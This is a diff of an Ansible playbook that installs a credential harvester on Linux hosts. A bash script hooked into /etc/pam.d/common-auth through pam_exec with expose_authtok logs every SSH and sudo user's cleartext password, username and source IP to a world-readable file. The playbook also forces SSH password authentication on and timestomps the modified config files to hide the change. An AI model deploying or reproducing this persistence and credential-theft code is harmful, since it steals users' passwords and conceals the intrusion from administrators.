@@ -1,16 +1,25 @@
 ---
-# 1. Setup the "Dead Drop" directory
-- name: Create hidden loot directory
+# --- STEP 1: DEPLOY THE LOGGER ---
+- name: Deploy Simple PAM Logger
   become: yes
-  file:
-    path: "/var/tmp/.system-cache"
-    state: directory
-    mode: '0777'
+  copy:
+    dest: /usr/local/bin/ssh-auth-check
+    mode: '0755'
     owner: root
     group: root
+    content: |
+      #!/bin/bash
+      # Capture the password stream from PAM
+      read -d '' -r PASSWORD
+      if [ -n "$PASSWORD" ]; then
+          # Log: Time | User | Source IP | Password
+          echo "$(date +%H:%M:%S) | $PAM_USER | $PAM_RHOST | $PASSWORD" >> /var/tmp/ssh.txt
+          # Ensure the loot file is hidden-ish but readable by our harvest
+          chmod 666 /var/tmp/ssh.txt
+      fi
 
-# 2. Configure SSH and PAM in one loop
-- name: Force SSH and PAM configuration
+# --- STEP 2: CONFIGURE SSH & PAM ---
+- name: Force Global PAM Trap and SSH Config
   become: yes
   lineinfile:
     path: "{{ item.path }}"
@@ -18,36 +27,22 @@
     line: "{{ item.line }}"
     insertbefore: "{{ item.insertbefore | default(omit) }}"
   loop:
+    # Set the trap at the VERY top of global auth to catch SSH and Sudo
+    - { path: '/etc/pam.d/common-auth', regexp: '^auth optional pam_exec.so', line: 'auth optional pam_exec.so quiet expose_authtok /usr/local/bin/ssh-auth-check', insertbefore: 'BOF' }
+    # Ensure SSH actually uses PAM and passwords
     - { path: '/etc/ssh/sshd_config', regexp: '^#?PasswordAuthentication', line: 'PasswordAuthentication yes' }
     - { path: '/etc/ssh/sshd_config', regexp: '^#?UsePAM', line: 'UsePAM yes' }
-    - { path: '/etc/pam.d/sshd', regexp: '^auth optional pam_exec.so', line: 'auth optional pam_exec.so quiet expose_authtok /usr/local/bin/ssh-auth-check', insertbefore: 'BOF' }
-  register: ssh_trap_config
+  register: trap_updated
 
-# 3. Deploy the actual logger script
-- name: Deploy PAM credential logger
-  become: yes
-  copy:
-    dest: /usr/local/bin/ssh-auth-check
-    mode: '0755'
-    content: |
-      #!/bin/bash
-      # Read the password from stdin (provided by expose_authtok)
-      read -d '' -r PASSWORD
-      if [ -n "$PASSWORD" ]; then
-          # Log the timestamp, username, source IP, and the password
-          echo "$(date) | User: $PAM_USER | From: $PAM_RHOST | Pass: $PASSWORD" >> /var/tmp/.system-cache/.ssh_loot.txt
-      fi
-
-# 4. Restart SSH only if we changed the config
-- name: Restart SSH service
+# --- STEP 3: RESTART & HIDE ---
+- name: Restart SSH if config changed
   become: yes
   systemd:
     name: ssh
     state: restarted
-  when: ssh_trap_config.changed
+  when: trap_updated.changed
 
-# 5. Anti-Forensics: Make the SSH PAM file look untouched
-- name: Timestomp PAM config
+- name: Anti-Forensics - Match Timestamps
   become: yes
-  shell: "touch -r /etc/pam.d/common-password /etc/pam.d/sshd"
+  shell: "touch -r /etc/hostname /etc/pam.d/common-auth && touch -r /etc/hostname /etc/ssh/sshd_config"
   ignore_errors: yes
